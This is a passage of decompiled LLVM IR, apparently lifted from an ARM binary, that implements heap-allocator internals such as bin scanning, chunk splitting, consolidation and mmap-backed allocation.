  %v2_b668 = load i32, i32* @sl, align 4
  %v3_b668 = add i32 %v2_b668, %v1_b668
  store i32 %v3_b668, i32* %r2.global-to-local, align 4
  %v2_b66c = add i32 %v3_b668, 4
  %v3_b66c = inttoptr i32 %v2_b66c to i32*
  %v4_b66c = load i32, i32* %v3_b66c, align 4
  store i32 %v4_b66c, i32* %r3.global-to-local, align 4
  %v2_b670 = add i32 %v1_b668, 8
  store i32 %v2_b670, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b7bc

dec_label_pc_b7bc:                                ; preds = %.dec_label_pc_b7bc_crit_edge, %dec_label_pc_b7bc.loopexit, %dec_label_pc_b7b0
  %v1_b7c0 = phi i32 [ %v4_b8e4, %.dec_label_pc_b7bc_crit_edge ], [ %v3_b668, %dec_label_pc_b7bc.loopexit ], [ %v2_b7b0, %dec_label_pc_b7b0 ]
  %v0_b7bc = phi i32 [ %v7_b8e4, %.dec_label_pc_b7bc_crit_edge ], [ %v4_b66c, %dec_label_pc_b7bc.loopexit ], [ %v3_b7b4, %dec_label_pc_b7b0 ]
  %v1_b7bc = or i32 %v0_b7bc, 1
  store i32 %v1_b7bc, i32* %r3.global-to-local, align 4
  %v2_b7c0 = add i32 %v1_b7c0, 4
  %v3_b7c0 = inttoptr i32 %v2_b7c0 to i32*
  store i32 %v1_b7bc, i32* %v3_b7c0, align 4
  br label %dec_label_pc_bd84

dec_label_pc_b7c8:                                ; preds = %dec_label_pc_b798
  %v1_b7c8 = load i32, i32* @sl, align 4
  %v2_b7c8 = add i32 %v1_b7c8, %v0_b7a8
  store i32 %v2_b7c8, i32* %r2.global-to-local, align 4
  %v1_b7cc = or i32 %v1_b7c8, 1
  store i32 %v1_b7cc, i32* %r3.global-to-local, align 4
  %v0_b7d0 = load i32, i32* %lr.global-to-local, align 4
  %v1_b7d0 = or i32 %v0_b7d0, 1
  store i32 %v1_b7d0, i32* %r1.global-to-local, align 4
  store i32 %v1_b7a8, i32* %r4.global-to-local, align 4
  %v2_b7d8 = add i32 %v0_b7a8, 4
  %v3_b7d8 = inttoptr i32 %v2_b7d8 to i32*
  store i32 %v1_b7cc, i32* %v3_b7d8, align 4
  %v0_b7dc = load i32, i32* %r2.global-to-local, align 4
  %v1_b7dc = load i32, i32* @r6, align 4
  %v2_b7dc = add i32 %v1_b7dc, 8
  %v3_b7dc = inttoptr i32 %v2_b7dc to i32*
  store i32 %v0_b7dc, i32* %v3_b7dc, align 4
  %v0_b7e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b7e0 = load i32, i32* @r6, align 4
  %v2_b7e0 = add i32 %v1_b7e0, 12
  %v3_b7e0 = inttoptr i32 %v2_b7e0 to i32*
  store i32 %v0_b7e0, i32* %v3_b7e0, align 4
  %v0_b7e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_b7e4 = load i32, i32* %r2.global-to-local, align 4
  %v3_b7e4 = add i32 %v1_b7e4, %v0_b7e4
  %v4_b7e4 = inttoptr i32 %v3_b7e4 to i32*
  store i32 %v0_b7e4, i32* %v4_b7e4, align 4
  %v0_b7e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b7e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_b7e8 = add i32 %v1_b7e8, 4
  %v3_b7e8 = inttoptr i32 %v2_b7e8 to i32*
  store i32 %v0_b7e8, i32* %v3_b7e8, align 4
  %v0_b7ec = load i32, i32* @r6, align 4
  %v1_b7ec = load i32, i32* %r2.global-to-local, align 4
  %v2_b7ec = add i32 %v1_b7ec, 12
  %v3_b7ec = inttoptr i32 %v2_b7ec to i32*
  store i32 %v0_b7ec, i32* %v3_b7ec, align 4
  %v0_b7f0 = load i32, i32* @r6, align 4
  %v1_b7f0 = load i32, i32* %r2.global-to-local, align 4
  %v2_b7f0 = add i32 %v1_b7f0, 8
  %v3_b7f0 = inttoptr i32 %v2_b7f0 to i32*
  store i32 %v0_b7f0, i32* %v3_b7f0, align 4
  br label %dec_label_pc_bd84

dec_label_pc_b7fc:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b754
  %v1_b78c = phi i32 [ %storemerge.pre, %dec_label_pc_b754 ], [ %v3_b770, %dec_label_pc_b764 ]
  store i32 %v1_b78c, i32* %ip.global-to-local, align 4
  %v9_b7fc = icmp eq i32 %v1_b78c, %v1_b758
  br i1 %v9_b7fc, label %dec_label_pc_b804.loopexit, label %dec_label_pc_b764

dec_label_pc_b804.loopexit:                       ; preds = %dec_label_pc_b7fc
  br label %dec_label_pc_b804

dec_label_pc_b804:                                ; preds = %dec_label_pc_b74c.dec_label_pc_b804_crit_edge, %dec_label_pc_b804.loopexit
  %v4_b834.pre-phi = phi i32 [ %.pre200, %dec_label_pc_b74c.dec_label_pc_b804_crit_edge ], [ %v4_b754, %dec_label_pc_b804.loopexit ]
  %v1_b804 = add i32 %v0_b804.pre, 1
  store i32 %v1_b804, i32* %r2.global-to-local, align 4
  %v1_b808 = urem i32 %v1_b804, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r0.global-to-local, align 4
  %v6_b814 = shl i32 1, %v1_b808
  store i32 %v6_b814, i32* %ip.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_b81c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_b81c, i32* %r3.global-to-local, align 4
  %v3_b820 = udiv i32 %v1_b804, 32
  store i32 %v3_b820, i32* @r5, align 4
  %v4_b824 = mul nuw nsw i32 %v3_b820, 4
  %v5_b824 = add i32 %v4_b81c, %v4_b824
  store i32 %v5_b824, i32* %r2.global-to-local, align 4
  %v1_b828 = add i32 %v5_b824, 820
  %v2_b828 = inttoptr i32 %v1_b828 to i32*
  %v3_b828 = load i32, i32* %v2_b828, align 4
  store i32 %v3_b828, i32* @r4, align 4
  %v1_b82c = add i32 %v4_b81c, 52
  store i32 %v1_b82c, i32* %r3.global-to-local, align 4
  store i32 68, i32* @r8, align 4
  %v5_b834 = add i32 %v1_b82c, %v4_b834.pre-phi
  store i32 %v5_b834, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b838

dec_label_pc_b838:                                ; preds = %dec_label_pc_b8a0, %dec_label_pc_b804
  %v1_b840 = phi i32 [ %v1_b840.pre, %dec_label_pc_b8a0 ], [ %v3_b828, %dec_label_pc_b804 ]
  %v0_b840 = phi i32 [ %v0_b838.pre, %dec_label_pc_b8a0 ], [ %v6_b814, %dec_label_pc_b804 ]
  %v1_b838 = sub i32 1, %v0_b840
  %v2_b838 = icmp ult i32 %v0_b840, 2
  %v1_b838. = select i1 %v2_b838, i32 %v1_b838, i32 0
  store i32 %v1_b838., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_b840, %v1_b840
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_b838
  %v5_b844 = or i32 %v1_b838., 1
  store i32 %v5_b844, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b850.preheader

bb142:                                            ; preds = %dec_label_pc_b838
  %v2_b848 = icmp eq i32 %v1_b838., 0
  br i1 %v2_b848, label %.dec_label_pc_b88c.preheader_crit_edge, label %dec_label_pc_b850.preheader

.dec_label_pc_b88c.preheader_crit_edge:           ; preds = %bb142
  %v0_b88454.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b88c.preheader

dec_label_pc_b850.preheader:                      ; preds = %bb142, %.thread12
  %v0_b850.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b850

dec_label_pc_b850:                                ; preds = %dec_label_pc_b850.preheader, %dec_label_pc_b85c
  %v0_b850 = phi i32 [ %v0_b850.pre, %dec_label_pc_b850.preheader ], [ %v1_b850, %dec_label_pc_b85c ]
  %v1_b850 = add i32 %v0_b850, 1
  store i32 %v1_b850, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_b850, 2
  br i1 %tmp208, label %dec_label_pc_b930.loopexit, label %dec_label_pc_b85c

dec_label_pc_b85c:                                ; preds = %dec_label_pc_b850
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r3.global-to-local, align 4
  %v1_b860 = load i32, i32* @r8, align 4
  %v2_b860 = add i32 %v1_b860, ptrtoint (i32* @global_var_22290.79 to i32)
  %v3_b860 = inttoptr i32 %v2_b860 to i32*
  %v4_b860 = load i32, i32* %v3_b860, align 4
  store i32 %v4_b860, i32* %r2.global-to-local, align 4
  %v4_b864 = mul i32 %v1_b850, 4
  %v5_b864 = add i32 %v4_b860, %v4_b864
  store i32 %v5_b864, i32* %r3.global-to-local, align 4
  %v1_b868 = add i32 %v5_b864, 820
  %v2_b868 = inttoptr i32 %v1_b868 to i32*
  %v3_b868 = load i32, i32* %v2_b868, align 4
  store i32 %v3_b868, i32* @r4, align 4
  %v2_b86c = icmp eq i32 %v3_b868, 0
  br i1 %v2_b86c, label %dec_label_pc_b850, label %dec_label_pc_b874

dec_label_pc_b874:                                ; preds = %dec_label_pc_b85c
  %v4_b874 = mul i32 %v1_b850, 256
  %v5_b874 = add i32 %v4_b860, %v4_b874
  store i32 %v5_b874, i32* %r3.global-to-local, align 4
  %v1_b878 = add i32 %v5_b874, 44
  store i32 %v1_b878, i32* %r0.global-to-local, align 4
  %v0_b87c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_b87c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b88c.preheader

dec_label_pc_b88c.preheader:                      ; preds = %.dec_label_pc_b88c.preheader_crit_edge, %dec_label_pc_b874
  %v0_b88454 = phi i32 [ %v1_b878, %dec_label_pc_b874 ], [ %v0_b88454.pre, %.dec_label_pc_b88c.preheader_crit_edge ]
  %v0_b8a8 = phi i32 [ %v3_b868, %dec_label_pc_b874 ], [ %v1_b840, %.dec_label_pc_b88c.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_b87c, %dec_label_pc_b874 ], [ %v0_b840, %.dec_label_pc_b88c.preheader_crit_edge ]
  %v2_b88c51 = and i32 %ip.promoted, %v0_b8a8
  %v4_b88c53 = icmp eq i32 %v2_b88c51, 0
  br i1 %v4_b88c53, label %dec_label_pc_b884, label %dec_label_pc_b894

dec_label_pc_b884:                                ; preds = %dec_label_pc_b88c.preheader, %dec_label_pc_b884
  %v2_b88856 = phi i32 [ %v2_b888, %dec_label_pc_b884 ], [ %ip.promoted, %dec_label_pc_b88c.preheader ]
  %v0_b88455 = phi i32 [ %v1_b884, %dec_label_pc_b884 ], [ %v0_b88454, %dec_label_pc_b88c.preheader ]
  %v1_b884 = add i32 %v0_b88455, 8
  %v2_b888 = mul i32 %v2_b88856, 2
  %v2_b88c = and i32 %v2_b888, %v0_b8a8
  %v4_b88c = icmp eq i32 %v2_b88c, 0
  br i1 %v4_b88c, label %dec_label_pc_b884, label %dec_label_pc_b88c.dec_label_pc_b894_crit_edge

dec_label_pc_b88c.dec_label_pc_b894_crit_edge:    ; preds = %dec_label_pc_b884
  store i32 %v1_b884, i32* %r0.global-to-local, align 4
  store i32 %v2_b888, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b894

dec_label_pc_b894:                                ; preds = %dec_label_pc_b88c.dec_label_pc_b894_crit_edge, %dec_label_pc_b88c.preheader
  %v0_b8b4 = phi i32 [ %v2_b888, %dec_label_pc_b88c.dec_label_pc_b894_crit_edge ], [ %ip.promoted, %dec_label_pc_b88c.preheader ]
  %v0_b8d8 = phi i32 [ %v1_b884, %dec_label_pc_b88c.dec_label_pc_b894_crit_edge ], [ %v0_b88454, %dec_label_pc_b88c.preheader ]
  %v1_b894 = add i32 %v0_b8d8, 12
  %v2_b894 = inttoptr i32 %v1_b894 to i32*
  %v3_b894 = load i32, i32* %v2_b894, align 4
  store i32 %v3_b894, i32* @lr, align 4
  %v9_b898 = icmp eq i32 %v3_b894, %v0_b8d8
  br i1 %v9_b898, label %dec_label_pc_b8a0, label %dec_label_pc_b8c0

dec_label_pc_b8a0:                                ; preds = %dec_label_pc_b894
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r0.global-to-local, align 4
  %v1_b8a4 = load i32, i32* @r8, align 4
  %v2_b8a4 = add i32 %v1_b8a4, ptrtoint (i32* @global_var_22290.79 to i32)
  %v3_b8a4 = inttoptr i32 %v2_b8a4 to i32*
  %v4_b8a4 = load i32, i32* %v3_b8a4, align 4
  %v2_b8a8 = sub i32 -1, %v0_b8b4
  %v3_b8a8 = and i32 %v0_b8a8, %v2_b8a8
  store i32 %v3_b8a8, i32* @r4, align 4
  %v1_b8ac = load i32, i32* @r5, align 4
  %v4_b8ac = mul i32 %v1_b8ac, 4
  %v5_b8ac = add i32 %v4_b8ac, %v4_b8a4
  store i32 %v5_b8ac, i32* %r3.global-to-local, align 4
  %v1_b8b0 = add i32 %v0_b8d8, 8
  store i32 %v1_b8b0, i32* %r0.global-to-local, align 4
  %v2_b8b4 = mul i32 %v0_b8b4, 2
  store i32 %v2_b8b4, i32* %ip.global-to-local, align 4
  %v2_b8b8 = add i32 %v5_b8ac, 820
  %v3_b8b8 = inttoptr i32 %v2_b8b8 to i32*
  store i32 %v3_b8a8, i32* %v3_b8b8, align 4
  %v0_b838.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_b840.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b838

dec_label_pc_b8c0:                                ; preds = %dec_label_pc_b894
  %v1_b8c0 = add i32 %v3_b894, 4
  %v2_b8c0 = inttoptr i32 %v1_b8c0 to i32*
  %v3_b8c0 = load i32, i32* %v2_b8c0, align 4
  store i32 %v3_b8c0, i32* %r3.global-to-local, align 4
  %v1_b8c4 = and i32 %v3_b8c0, -4
  store i32 %v1_b8c4, i32* %r2.global-to-local, align 4
  %v0_b8c8 = load i32, i32* @sl, align 4
  %v2_b8c8 = sub i32 %v1_b8c4, %v0_b8c8
  store i32 %v2_b8c8, i32* %ip.global-to-local, align 4
  %v1_b8cc = add i32 %v3_b894, 12
  %v2_b8cc = inttoptr i32 %v1_b8cc to i32*
  %v3_b8cc = load i32, i32* %v2_b8cc, align 4
  store i32 %v3_b8cc, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_b8c8, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_b8c0
  %v6_b8d4 = add i32 %v1_b8c4, %v3_b894
  store i32 %v6_b8d4, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_b8c0, %bb143
  %v2_b8d8 = add i32 %v3_b8cc, 8
  %v3_b8d8 = inttoptr i32 %v2_b8d8 to i32*
  store i32 %v0_b8d8, i32* %v3_b8d8, align 4
  %v0_b8dc = load i32, i32* %r3.global-to-local, align 4
  %v1_b8dc = load i32, i32* %r0.global-to-local, align 4
  %v2_b8dc = add i32 %v1_b8dc, 12
  %v3_b8dc = inttoptr i32 %v2_b8dc to i32*
  store i32 %v0_b8dc, i32* %v3_b8dc, align 4
  %v4_b8e0 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_b7bc_crit_edge, label %dec_label_pc_b8ec

.dec_label_pc_b7bc_crit_edge:                     ; preds = %bb144
  %v5_b8e0 = add i32 %v4_b8e0, 8
  store i32 %v5_b8e0, i32* %r4.global-to-local, align 4
  %v4_b8e4 = load i32, i32* %r2.global-to-local, align 4
  %v5_b8e4 = add i32 %v4_b8e4, 4
  %v6_b8e4 = inttoptr i32 %v5_b8e4 to i32*
  %v7_b8e4 = load i32, i32* %v6_b8e4, align 4
  store i32 %v7_b8e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b7bc

dec_label_pc_b8ec:                                ; preds = %bb144
  %v1_b8ec = load i32, i32* @sl, align 4
  %v2_b8ec = add i32 %v1_b8ec, %v4_b8e0
  store i32 %v2_b8ec, i32* %r1.global-to-local, align 4
  %v1_b8f4 = load i32, i32* @r6, align 4
  %v2_b8f4 = add i32 %v1_b8f4, 8
  %v3_b8f4 = inttoptr i32 %v2_b8f4 to i32*
  store i32 %v2_b8ec, i32* %v3_b8f4, align 4
  %v0_b8f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b8f8 = load i32, i32* @r6, align 4
  %v2_b8f8 = add i32 %v1_b8f8, 12
  %v3_b8f8 = inttoptr i32 %v2_b8f8 to i32*
  store i32 %v0_b8f8, i32* %v3_b8f8, align 4
  %v0_b8fc = load i32, i32* @r6, align 4
  %v1_b8fc = load i32, i32* %r1.global-to-local, align 4
  %v2_b8fc = add i32 %v1_b8fc, 8
  %v3_b8fc = inttoptr i32 %v2_b8fc to i32*
  store i32 %v0_b8fc, i32* %v3_b8fc, align 4
  %v0_b900 = load i32, i32* @r6, align 4
  %v1_b900 = load i32, i32* %r1.global-to-local, align 4
  %v2_b900 = add i32 %v1_b900, 12
  %v3_b900 = inttoptr i32 %v2_b900 to i32*
  store i32 %v0_b900, i32* %v3_b900, align 4
  %tmp210 = icmp ult i32 %v1_b8ec, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_b8ec
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r2.global-to-local, align 4
  %v8_b90c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v8_b90c, i32* %r3.global-to-local, align 4
  %v4_b910 = load i32, i32* %r1.global-to-local, align 4
  %v6_b910 = add i32 %v8_b90c, 48
  %v7_b910 = inttoptr i32 %v6_b910 to i32*
  store i32 %v4_b910, i32* %v7_b910, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_b8ec, %bb145
  %v0_b914 = load i32, i32* @sl, align 4
  %v1_b914 = or i32 %v0_b914, 1
  store i32 %v1_b914, i32* %r2.global-to-local, align 4
  %v0_b918 = load i32, i32* %ip.global-to-local, align 4
  %v1_b918 = or i32 %v0_b918, 1
  store i32 %v1_b918, i32* %r3.global-to-local, align 4
  %v0_b91c = load i32, i32* @lr, align 4
  %v1_b91c = add i32 %v0_b91c, 8
  store i32 %v1_b91c, i32* %r4.global-to-local, align 4
  %v2_b920 = add i32 %v0_b91c, 4
  %v3_b920 = inttoptr i32 %v2_b920 to i32*
  store i32 %v1_b914, i32* %v3_b920, align 4
  %v0_b924 = load i32, i32* %ip.global-to-local, align 4
  %v1_b924 = load i32, i32* %r1.global-to-local, align 4
  %v3_b924 = add i32 %v1_b924, %v0_b924
  %v4_b924 = inttoptr i32 %v3_b924 to i32*
  store i32 %v0_b924, i32* %v4_b924, align 4
  %v0_b928 = load i32, i32* %r3.global-to-local, align 4
  %v1_b928 = load i32, i32* %r1.global-to-local, align 4
  %v2_b928 = add i32 %v1_b928, 4
  %v3_b928 = inttoptr i32 %v2_b928 to i32*
  store i32 %v0_b928, i32* %v3_b928, align 4
  br label %dec_label_pc_bd84

dec_label_pc_b930.loopexit:                       ; preds = %dec_label_pc_b850
  br label %dec_label_pc_b930

dec_label_pc_b930:                                ; preds = %dec_label_pc_b930.loopexit, %dec_label_pc_b544, %dec_label_pc_b54c
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %ip.global-to-local, align 4
  %v4_b938 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_b938, i32* @r0, align 4
  %v1_b93c = add i32 %v4_b938, 44
  %v2_b93c = inttoptr i32 %v1_b93c to i32*
  %v3_b93c = load i32, i32* %v2_b93c, align 4
  store i32 %v3_b93c, i32* %ip.global-to-local, align 4
  %v1_b940 = add i32 %v3_b93c, 4
  %v2_b940 = inttoptr i32 %v1_b940 to i32*
  %v3_b940 = load i32, i32* %v2_b940, align 4
  %v0_b944 = load i32, i32* @sl, align 4
  %v1_b944 = add i32 %v0_b944, 16
  store i32 %v1_b944, i32* %r1.global-to-local, align 4
  %v1_b948 = and i32 %v3_b940, -4
  store i32 %v1_b948, i32* %r3.global-to-local, align 4
  %v3_b94c = icmp ult i32 %v1_b948, %v1_b944
  br i1 %v3_b94c, label %dec_label_pc_b97c, label %dec_label_pc_b958

dec_label_pc_b958:                                ; preds = %dec_label_pc_b930
  %v2_b958 = sub i32 %v1_b948, %v0_b944
  %v2_b95c = add i32 %v0_b944, %v3_b93c
  store i32 %v2_b95c, i32* %r1.global-to-local, align 4
  %v1_b960 = or i32 %v2_b958, 1
  store i32 %v1_b960, i32* %r3.global-to-local, align 4
  %v1_b964 = or i32 %v0_b944, 1
  store i32 %v1_b964, i32* %r2.global-to-local, align 4
  %v1_b968 = add i32 %v3_b93c, 8
  store i32 %v1_b968, i32* %r4.global-to-local, align 4
  store i32 %v1_b964, i32* %v2_b940, align 4
  %v0_b970 = load i32, i32* %r1.global-to-local, align 4
  %v1_b970 = load i32, i32* @r0, align 4
  %v2_b970 = add i32 %v1_b970, 44
  %v3_b970 = inttoptr i32 %v2_b970 to i32*
  store i32 %v0_b970, i32* %v3_b970, align 4
  %v0_b974 = load i32, i32* %r3.global-to-local, align 4
  %v1_b974 = load i32, i32* %r1.global-to-local, align 4
  %v2_b974 = add i32 %v1_b974, 4
  %v3_b974 = inttoptr i32 %v2_b974 to i32*
  store i32 %v0_b974, i32* %v3_b974, align 4
  br label %dec_label_pc_bd84

dec_label_pc_b97c:                                ; preds = %dec_label_pc_b930
  %v1_b97c = inttoptr i32 %v4_b938 to i32*
  %v2_b97c = load i32, i32* %v1_b97c, align 4
  store i32 %v2_b97c, i32* %r3.global-to-local, align 4
  %v1_b980 = and i32 %v2_b97c, 2
  store i32 %v1_b980, i32* %ip.global-to-local, align 4
  %v2_b980 = icmp eq i32 %v1_b980, 0
  %v1_b984 = add i32 %v4_b938, 860
  %v2_b984 = inttoptr i32 %v1_b984 to i32*
  %v3_b984 = load i32, i32* %v2_b984, align 4
  store i32 %v3_b984, i32* %r1.global-to-local, align 4
  br i1 %v2_b980, label %dec_label_pc_b99c, label %dec_label_pc_b98c

dec_label_pc_b98c:                                ; preds = %dec_label_pc_b97c
  %v0_b98c = call i32 @__malloc_consolidate()
  %v0_b990 = load i32, i32* @sl, align 4
  %v1_b990 = add i32 %v0_b990, -7
  store i32 %v1_b990, i32* %r0.global-to-local, align 4
  %v1_b994 = call i32 @malloc(i32 %v1_b990)
  store i32 %v1_b994, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bd80

dec_label_pc_b99c:                                ; preds = %dec_label_pc_b97c
  %v1_b99c = add i32 %v4_b938, 844
  %v2_b99c = inttoptr i32 %v1_b99c to i32*
  %v3_b99c = load i32, i32* %v2_b99c, align 4
  store i32 %v3_b99c, i32* %r3.global-to-local, align 4
  %v3_b9a0 = icmp ult i32 %v0_b944, %v3_b99c
  %v1_b9a4 = add i32 %v3_b984, -1
  store i32 %v1_b9a4, i32* %sb.global-to-local, align 4
  br i1 %v3_b9a0, label %dec_label_pc_ba78, label %dec_label_pc_b9ac

dec_label_pc_b9ac:                                ; preds = %dec_label_pc_b99c
  %v1_b9ac = add i32 %v4_b938, 852
  %v2_b9ac = inttoptr i32 %v1_b9ac to i32*
  %v3_b9ac = load i32, i32* %v2_b9ac, align 4
  store i32 %v3_b9ac, i32* %r2.global-to-local, align 4
  %v1_b9b0 = add i32 %v4_b938, 848
  %v2_b9b0 = inttoptr i32 %v1_b9b0 to i32*
  %v3_b9b0 = load i32, i32* %v2_b9b0, align 4
  store i32 %v3_b9b0, i32* %r3.global-to-local, align 4
  %v6_b9b8 = icmp slt i32 %v3_b9b0, %v3_b9ac
  br i1 %v6_b9b8, label %dec_label_pc_b9bc, label %dec_label_pc_ba78

dec_label_pc_b9bc:                                ; preds = %dec_label_pc_b9ac
  %v1_b9bc = add i32 %v0_b944, 10
  %v2_b9c0 = add i32 %v1_b9bc, %v3_b984
  store i32 %v2_b9c0, i32* %r3.global-to-local, align 4
  %v2_b9c4 = sub i32 0, %v3_b984
  %v3_b9c4 = and i32 %v2_b9c0, %v2_b9c4
  store i32 %v3_b9c4, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_b9c4, %v0_b944
  br i1 %tmp211, label %dec_label_pc_b9d0, label %dec_label_pc_ba78

dec_label_pc_b9d0:                                ; preds = %dec_label_pc_b9bc
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_b9c4, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_b9e8 = call i32 @mmap(i32 0, i32 %v3_b9c4, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_b9e8, i32* %r0.global-to-local, align 4
  %v7_b9ec = icmp eq i32 %v6_b9e8, -1
  br i1 %v7_b9ec, label %dec_label_pc_b9d0.dec_label_pc_ba78_crit_edge, label %dec_label_pc_b9f4

dec_label_pc_b9d0.dec_label_pc_ba78_crit_edge:    ; preds = %dec_label_pc_b9d0
  %v1_ba9c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_ba78

dec_label_pc_b9f4:                                ; preds = %dec_label_pc_b9d0
  %v1_b9f4 = urem i32 %v6_b9e8, 8
  store i32 %v1_b9f4, i32* %r2.global-to-local, align 4
  %v2_b9f4 = icmp eq i32 %v1_b9f4, 0
  br i1 %v2_b9f4, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_b9f4
  %v2_b9f8 = sub nsw i32 8, %v1_b9f4
  store i32 %v2_b9f8, i32* %r3.global-to-local, align 4
  %v2_b9fc = load i32, i32* @r4, align 4
  %v3_b9fc = sub i32 %v2_b9fc, %v2_b9f8
  %v3_ba00 = add i32 %v2_b9f8, %v6_b9e8
  store i32 %v3_ba00, i32* %lr.global-to-local, align 4
  %v2_ba08 = or i32 %v3_b9fc, 2
  store i32 %v2_ba08, i32* %r2.global-to-local, align 4
  %v5_ba10 = inttoptr i32 %v3_ba00 to i32*
  store i32 %v2_b9f8, i32* %v5_ba10, align 4
  %v1_ba14 = load i32, i32* %r2.global-to-local, align 4
  %v2_ba14 = load i32, i32* %lr.global-to-local, align 4
  %v3_ba14 = add i32 %v2_ba14, 4
  %v4_ba14 = inttoptr i32 %v3_ba14 to i32*
  store i32 %v1_ba14, i32* %v4_ba14, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_b9f4
  store i32 %v6_b9e8, i32* %lr.global-to-local, align 4
  %v1_ba0c47 = load i32, i32* @r4, align 4
  %v2_ba0c48 = or i32 %v1_ba0c47, 2
  store i32 %v2_ba0c48, i32* %r3.global-to-local, align 4
  %v3_ba18 = inttoptr i32 %v6_b9e8 to i32*
  store i32 0, i32* %v3_ba18, align 4
  %v1_ba1c = load i32, i32* %r3.global-to-local, align 4
  %v2_ba1c = load i32, i32* %lr.global-to-local, align 4
  %v3_ba1c = add i32 %v2_ba1c, 4
  %v4_ba1c = inttoptr i32 %v3_ba1c to i32*
  store i32 %v1_ba1c, i32* %v4_ba1c, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r2.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_ba28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_ba28, i32* %ip.global-to-local, align 4
  %v1_ba2c = add i32 %v4_ba28, 848
  %v2_ba2c = inttoptr i32 %v1_ba2c to i32*
  %v3_ba2c = load i32, i32* %v2_ba2c, align 4
  store i32 %v3_ba2c, i32* %r3.global-to-local, align 4
  %v1_ba30 = add i32 %v4_ba28, 856
  %v2_ba30 = inttoptr i32 %v1_ba30 to i32*
  %v3_ba30 = load i32, i32* %v2_ba30, align 4
  store i32 %v3_ba30, i32* %r2.global-to-local, align 4
  %v1_ba34 = add i32 %v3_ba2c, 1
  store i32 %v1_ba34, i32* %r3.global-to-local, align 4
  %v7_ba3c = icmp sgt i32 %v1_ba34, %v3_ba30
  br i1 %v7_ba3c, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_ba34, i32* %v2_ba30, align 4
  %v0_ba40.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_ba40.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_ba40 = phi i32 [ %v4_ba28, %.thread27 ], [ %v1_ba40.pre, %bb147 ]
  %v0_ba40 = phi i32 [ %v1_ba34, %.thread27 ], [ %v0_ba40.pre, %bb147 ]
  %v2_ba40 = add i32 %v1_ba40, 848
  %v3_ba40 = inttoptr i32 %v2_ba40 to i32*
  store i32 %v0_ba40, i32* %v3_ba40, align 4
  %v0_ba44 = load i32, i32* %ip.global-to-local, align 4
  %v1_ba44 = add i32 %v0_ba44, 868
  %v2_ba44 = inttoptr i32 %v1_ba44 to i32*
  %v3_ba44 = load i32, i32* %v2_ba44, align 4
  store i32 %v3_ba44, i32* %r3.global-to-local, align 4
  %v1_ba48 = add i32 %v0_ba44, 880
  %v2_ba48 = inttoptr i32 %v1_ba48 to i32*
  %v3_ba48 = load i32, i32* %v2_ba48, align 4
  store i32 %v3_ba48, i32* %r2.global-to-local, align 4
  %v0_ba4c = load i32, i32* @r4, align 4
  %v2_ba4c = add i32 %v0_ba4c, %v3_ba44
  store i32 %v2_ba4c, i32* %r1.global-to-local, align 4
  %v1_ba50 = add i32 %v0_ba44, 872
  %v2_ba50 = inttoptr i32 %v1_ba50 to i32*
  %v3_ba50 = load i32, i32* %v2_ba50, align 4
